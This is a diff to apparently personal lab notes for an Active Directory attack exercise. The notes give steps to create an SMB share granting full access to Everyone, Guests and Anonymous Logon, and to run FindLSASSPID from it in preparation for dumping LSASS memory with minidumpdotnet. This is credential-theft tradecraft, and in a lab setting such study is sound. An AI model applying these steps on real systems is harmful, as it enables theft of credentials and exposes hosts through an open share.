@@ -1,10 +1,10 @@
 Must have `FindLSASSPID` and `minidumpdotnet` ready first
 
-Create a SMB share thats available to `Everyone` and `Guests`
+Create a SMB share thats available to `Everyone`, `Guests` and `Anonymous Logon `
 ```powershell
 net share share=C:\AD\Tools\share /grant:Everyone,Full
 ```
-
+![[Pasted image 20250521220229.png]]
 Run `FindLSASSPID` from share
 ```powershell
 \\DCORP-STD548.dollarcorp.moneycorp.local\share\FindLSASSPID.exe
